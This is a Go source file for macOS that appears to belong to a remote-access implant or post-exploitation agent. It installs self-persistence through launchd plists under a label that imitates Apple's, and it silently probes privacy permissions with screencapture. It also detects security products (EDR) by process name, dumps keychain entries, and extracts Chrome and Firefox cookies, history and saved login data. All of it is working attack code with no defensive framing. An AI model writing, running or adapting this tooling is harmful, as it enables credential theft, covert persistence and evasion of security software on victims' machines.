//go:build darwin
// +build darwin

package functions

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"

	"howett.net/plist"
)

// LaunchAgent/LaunchDaemon plist structure
type launchdPlist struct {
	Label            string   `plist:"Label"`
	ProgramArguments []string `plist:"ProgramArguments"`
	RunAtLoad        bool     `plist:"RunAtLoad"`
	KeepAlive        bool     `plist:"KeepAlive"`
	StandardOutPath  string   `plist:"StandardOutPath,omitempty"`
	StandardErrorPath string  `plist:"StandardErrorPath,omitempty"`
}

// PersistInstall creates a LaunchAgent or LaunchDaemon plist for persistence.
// method: "launchagent" or "launchdaemon"
// label: plist label, e.g. "com.apple.mdworker.local"
func PersistInstall(method, label string) (string, error) {
	selfPath, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("cannot resolve self path: %w", err)
	}

	var dir string
	switch method {
	case "launchagent":
		usr, err := user.Current()
		if err != nil {
			return "", err
		}
		dir = filepath.Join(usr.HomeDir, "Library", "LaunchAgents")
	case "launchdaemon":
		if os.Geteuid() != 0 {
			return "", fmt.Errorf("launchdaemon requires root privileges")
		}
		dir = "/Library/LaunchDaemons"
	default:
		return "", fmt.Errorf("unknown persistence method: %s", method)
	}

	if err := os.MkdirAll(dir, 0755); err != nil {
		return "", fmt.Errorf("cannot create directory %s: %w", dir, err)
	}

	plistPath := filepath.Join(dir, label+".plist")

	data := launchdPlist{
		Label:            label,
		ProgramArguments: []string{selfPath},
		RunAtLoad:        true,
		KeepAlive:        true,
	}

	buf, err := plist.MarshalIndent(data, plist.XMLFormat, "\t")
	if err != nil {
		return "", fmt.Errorf("cannot marshal plist: %w", err)
	}

	if err := os.WriteFile(plistPath, buf, 0644); err != nil {
		return "", fmt.Errorf("cannot write plist: %w", err)
	}

	// Load the plist immediately via launchctl
	_ = exec.Command("launchctl", "load", "-w", plistPath).Run()

	return fmt.Sprintf("Persistence installed: %s\nPlist: %s\nBinary: %s", method, plistPath, selfPath), nil
}

// PersistRemove removes a LaunchAgent or LaunchDaemon persistence.
func PersistRemove(method, label string) (string, error) {
	var dir string
	switch method {
	case "launchagent":
		usr, err := user.Current()
		if err != nil {
			return "", err
		}
		dir = filepath.Join(usr.HomeDir, "Library", "LaunchAgents")
	case "launchdaemon":
		dir = "/Library/LaunchDaemons"
	default:
		return "", fmt.Errorf("unknown persistence method: %s", method)
	}

	plistPath := filepath.Join(dir, label+".plist")

	if _, err := os.Stat(plistPath); os.IsNotExist(err) {
		return "", fmt.Errorf("plist not found: %s", plistPath)
	}

	// Unload first
	_ = exec.Command("launchctl", "unload", "-w", plistPath).Run()

	if err := os.Remove(plistPath); err != nil {
		return "", fmt.Errorf("cannot remove plist: %w", err)
	}

	return fmt.Sprintf("Persistence removed: %s\nDeleted: %s", method, plistPath), nil
}

// PersistStatus checks if any known persistence plists exist.
func PersistStatus() (string, error) {
	usr, err := user.Current()
	if err != nil {
		return "", err
	}

	selfPath, _ := os.Executable()
	var results []string

	// Check LaunchAgents
	agentDir := filepath.Join(usr.HomeDir, "Library", "LaunchAgents")
	results = append(results, checkPlistDir(agentDir, selfPath, "LaunchAgent")...)

	// Check LaunchDaemons (if readable)
	daemonDir := "/Library/LaunchDaemons"
	results = append(results, checkPlistDir(daemonDir, selfPath, "LaunchDaemon")...)

	if len(results) == 0 {
		return "No persistence found for this agent", nil
	}
	return strings.Join(results, "\n"), nil
}

func checkPlistDir(dir, selfPath, ptype string) []string {
	var results []string
	entries, err := os.ReadDir(dir)
	if err != nil {
		return results
	}

	for _, entry := range entries {
		if !strings.HasSuffix(entry.Name(), ".plist") {
			continue
		}
		path := filepath.Join(dir, entry.Name())
		f, err := os.Open(path)
		if err != nil {
			continue
		}
		var data launchdPlist
		decoder := plist.NewDecoder(f)
		err = decoder.Decode(&data)
		f.Close()
		if err != nil {
			continue
		}

		for _, arg := range data.ProgramArguments {
			if arg == selfPath {
				status := "loaded"
				// Check if actually loaded via launchctl
				out, err := exec.Command("launchctl", "list", data.Label).Output()
				if err != nil || len(out) == 0 {
					status = "installed (not loaded)"
				}
				results = append(results, fmt.Sprintf("[%s] %s — %s (%s)", ptype, data.Label, path, status))
				break
			}
		}
	}
	return results
}

// TccCheck probes TCC permissions by attempting to access protected resources.
func TccCheck() (string, error) {
	var results []string

	// Full Disk Access — try reading TCC.db
	tccPath := "/Library/Application Support/com.apple.TCC/TCC.db"
	if _, err := os.Open(tccPath); err == nil {
		results = append(results, "[+] Full Disk Access: GRANTED")
	} else {
		results = append(results, "[-] Full Disk Access: DENIED")
	}

	// Screen Recording — try screencapture
	tmpFile, err := os.CreateTemp("", "tcc-*.png")
	if err == nil {
		tmpPath := tmpFile.Name()
		tmpFile.Close()
		defer os.Remove(tmpPath)
		cmd := exec.Command("screencapture", "-x", "-t", "png", tmpPath)
		if err := cmd.Run(); err != nil {
			results = append(results, "[-] Screen Recording: DENIED or unavailable")
		} else {
			info, _ := os.Stat(tmpPath)
			if info != nil && info.Size() > 0 {
				results = append(results, "[+] Screen Recording: GRANTED")
			} else {
				results = append(results, "[-] Screen Recording: DENIED")
			}
		}
	}

	// Accessibility — no reliable probe without CGO (CGEventTap needs it)
	results = append(results, "[?] Accessibility: cannot probe without CGO")

	// Camera
	out, err := exec.Command("system_profiler", "SPCameraDataType").Output()
	if err == nil && len(out) > 0 {
		results = append(results, "[?] Camera: hardware detected (permission untested)")
	}

	// Clipboard — always available, no TCC
	results = append(results, "[+] Clipboard: no TCC required")

	return strings.Join(results, "\n"), nil
}

// DefaultsRead reads macOS defaults for a given domain.
func DefaultsRead(domain string) (string, error) {
	var cmd *exec.Cmd
	if domain == "" || domain == "all" {
		cmd = exec.Command("defaults", "read")
	} else {
		cmd = exec.Command("defaults", "read", domain)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%s\n%s", err.Error(), string(out))
	}
	return string(out), nil
}

// EdrCheck detects known EDR/security products on macOS.
func EdrCheck() (string, error) {
	var results []string

	// Known EDR process names
	edrProcesses := map[string]string{
		"falcond":          "CrowdStrike Falcon",
		"falconctl":        "CrowdStrike Falcon",
		"SentinelAgent":    "SentinelOne",
		"sentineld":        "SentinelOne",
		"JamfProtect":      "Jamf Protect",
		"JamfDaemon":       "Jamf Pro",
		"jamfAgent":        "Jamf Pro",
		"CbOsxSensorService": "Carbon Black",
		"CbDefense":        "Carbon Black",
		"EndpointSecurityClient": "macOS Endpoint Security (generic)",
		"MicrosoftDefender": "Microsoft Defender",
		"com.microsoft.dlp.daemon": "Microsoft DLP",
	}

	// Get running processes
	psOut, err := exec.Command("ps", "-axo", "comm=").Output()
	if err != nil {
		return "", fmt.Errorf("cannot enumerate processes: %w", err)
	}

	foundEdr := make(map[string]bool)
	for _, line := range strings.Split(string(psOut), "\n") {
		proc := strings.TrimSpace(filepath.Base(line))
		if product, ok := edrProcesses[proc]; ok {
			if !foundEdr[product] {
				foundEdr[product] = true
				results = append(results, fmt.Sprintf("[!] %s detected (process: %s)", product, proc))
			}
		}
	}

	// System Extensions
	sysExtOut, err := exec.Command("systemextensionsctl", "list").CombinedOutput()
	if err == nil {
		for _, line := range strings.Split(string(sysExtOut), "\n") {
			line = strings.TrimSpace(line)
			if strings.Contains(line, "enabled") || strings.Contains(line, "activated") {
				results = append(results, fmt.Sprintf("[*] System Extension: %s", line))
			}
		}
	}

	// Network Extensions (profiles)
	profOut, err := exec.Command("profiles", "list").CombinedOutput()
	if err == nil && len(profOut) > 10 {
		results = append(results, fmt.Sprintf("[*] Configuration profiles installed (%d bytes output)", len(profOut)))
	}

	if len(results) == 0 {
		return "No known EDR/security products detected", nil
	}

	return strings.Join(results, "\n"), nil
}

// KeychainList lists keychain entries using the security CLI.
func KeychainList() (string, error) {
	out, err := exec.Command("security", "list-keychains").CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("security list-keychains failed: %s", string(out))
	}

	result := "Keychains:\n" + string(out) + "\n"

	// Try to dump generic passwords (will prompt on macOS if not authorized)
	dumpOut, err := exec.Command("security", "dump-keychain").CombinedOutput()
	if err == nil {
		// Count entries
		count := strings.Count(string(dumpOut), "keychain:")
		result += fmt.Sprintf("Keychain entries: %d\n", count)
		// Only include first 8KB to avoid overwhelming output
		if len(dumpOut) > 8192 {
			result += string(dumpOut[:8192]) + "\n... (truncated)"
		} else {
			result += string(dumpOut)
		}
	} else {
		result += "dump-keychain: access denied or requires authorization"
	}

	return result, nil
}

// KeychainDump attempts to dump keychain entries with more detail.
func KeychainDump() (string, error) {
	out, err := exec.Command("security", "dump-keychain", "-d").CombinedOutput()
	if err != nil {
		// -d flag may cause password prompts; fallback without -d
		out, err = exec.Command("security", "dump-keychain").CombinedOutput()
		if err != nil {
			return "", fmt.Errorf("security dump-keychain failed: %s", string(out))
		}
	}
	if len(out) > 32768 {
		return string(out[:32768]) + "\n... (truncated at 32KB)", nil
	}
	return string(out), nil
}

// BrowserDumpChrome collects Chrome browser data (cookies, history, login data).
func BrowserDumpChrome(target string) (string, error) {
	usr, err := user.Current()
	if err != nil {
		return "", err
	}

	chromeDir := filepath.Join(usr.HomeDir, "Library", "Application Support", "Google", "Chrome", "Default")
	if _, err := os.Stat(chromeDir); os.IsNotExist(err) {
		return "", fmt.Errorf("Chrome profile not found: %s", chromeDir)
	}

	var targetFile string
	switch target {
	case "cookies":
		targetFile = filepath.Join(chromeDir, "Cookies")
	case "history":
		targetFile = filepath.Join(chromeDir, "History")
	case "logins":
		targetFile = filepath.Join(chromeDir, "Login Data")
	default:
		// List available files
		var files []string
		entries, _ := os.ReadDir(chromeDir)
		for _, e := range entries {
			if !e.IsDir() {
				info, _ := e.Info()
				if info != nil {
					files = append(files, fmt.Sprintf("  %s (%s)", e.Name(), formatSize(info.Size())))
				}
			}
		}
		return fmt.Sprintf("Chrome profile: %s\nFiles:\n%s\n\nUse: browser_dump chrome cookies|history|logins", chromeDir, strings.Join(files, "\n")), nil
	}

	if _, err := os.Stat(targetFile); os.IsNotExist(err) {
		return "", fmt.Errorf("file not found: %s", targetFile)
	}

	// SQLite databases — try to read with sqlite3 CLI
	var out []byte
	switch target {
	case "cookies":
		out, err = exec.Command("sqlite3", targetFile, ".mode column", ".headers on",
			"SELECT host_key, name, path, expires_utc, is_secure, is_httponly FROM cookies LIMIT 100;").CombinedOutput()
	case "history":
		out, err = exec.Command("sqlite3", targetFile, ".mode column", ".headers on",
			"SELECT url, title, visit_count, datetime(last_visit_time/1000000-11644473600,'unixepoch') as last_visit FROM urls ORDER BY last_visit_time DESC LIMIT 100;").CombinedOutput()
	case "logins":
		out, err = exec.Command("sqlite3", targetFile, ".mode column", ".headers on",
			"SELECT origin_url, username_value, length(password_value) as pwd_len FROM logins LIMIT 100;").CombinedOutput()
	}

	if err != nil {
		return "", fmt.Errorf("sqlite3 query failed: %s\n%s", err.Error(), string(out))
	}

	if len(out) == 0 {
		return fmt.Sprintf("No data found in %s", target), nil
	}

	return fmt.Sprintf("Chrome %s (top 100):\n%s", target, string(out)), nil
}

// BrowserDumpFirefox collects Firefox browser data.
func BrowserDumpFirefox(target string) (string, error) {
	usr, err := user.Current()
	if err != nil {
		return "", err
	}

	ffDir := filepath.Join(usr.HomeDir, "Library", "Application Support", "Firefox", "Profiles")
	if _, err := os.Stat(ffDir); os.IsNotExist(err) {
		return "", fmt.Errorf("Firefox profiles not found: %s", ffDir)
	}

	// Find the default profile (*.default-release or *.default)
	entries, err := os.ReadDir(ffDir)
	if err != nil {
		return "", err
	}

	var profileDir string
	for _, e := range entries {
		if e.IsDir() && (strings.HasSuffix(e.Name(), ".default-release") || strings.HasSuffix(e.Name(), ".default")) {
			profileDir = filepath.Join(ffDir, e.Name())
			break
		}
	}

	if profileDir == "" {
		// List all profiles
		var profiles []string
		for _, e := range entries {
			if e.IsDir() {
				profiles = append(profiles, "  "+e.Name())
			}
		}
		return fmt.Sprintf("Firefox profiles found:\n%s\nNo default profile detected", strings.Join(profiles, "\n")), nil
	}

	var targetFile string
	switch target {
	case "cookies":
		targetFile = filepath.Join(profileDir, "cookies.sqlite")
	case "history":
		targetFile = filepath.Join(profileDir, "places.sqlite")
	case "logins":
		targetFile = filepath.Join(profileDir, "logins.json")
	default:
		var files []string
		fentries, _ := os.ReadDir(profileDir)
		for _, e := range fentries {
			if !e.IsDir() {
				info, _ := e.Info()
				if info != nil {
					files = append(files, fmt.Sprintf("  %s (%s)", e.Name(), formatSize(info.Size())))
				}
			}
		}
		return fmt.Sprintf("Firefox profile: %s\nFiles:\n%s\n\nUse: browser_dump firefox cookies|history|logins", profileDir, strings.Join(files, "\n")), nil
	}

	if _, err := os.Stat(targetFile); os.IsNotExist(err) {
		return "", fmt.Errorf("file not found: %s", targetFile)
	}

	if target == "logins" {
		// logins.json — just read it
		data, err := os.ReadFile(targetFile)
		if err != nil {
			return "", err
		}
		if len(data) > 16384 {
			return string(data[:16384]) + "\n... (truncated)", nil
		}
		return string(data), nil
	}

	// SQLite databases
	var out []byte
	switch target {
	case "cookies":
		out, err = exec.Command("sqlite3", targetFile, ".mode column", ".headers on",
			"SELECT host, name, path, expiry, isSecure, isHttpOnly FROM moz_cookies LIMIT 100;").CombinedOutput()
	case "history":
		out, err = exec.Command("sqlite3", targetFile, ".mode column", ".headers on",
			"SELECT url, title, visit_count, datetime(last_visit_date/1000000,'unixepoch') as last_visit FROM moz_places ORDER BY last_visit_date DESC LIMIT 100;").CombinedOutput()
	}

	if err != nil {
		return "", fmt.Errorf("sqlite3 query failed: %s\n%s", err.Error(), string(out))
	}

	return fmt.Sprintf("Firefox %s (top 100):\n%s", target, string(out)), nil
}

func formatSize(bytes int64) string {
	const (
		KB = 1024.0
		MB = KB * 1024
	)
	if float64(bytes) >= MB {
		return fmt.Sprintf("%.1f MB", float64(bytes)/MB)
	}
	return fmt.Sprintf("%.1f KB", float64(bytes)/KB)
}
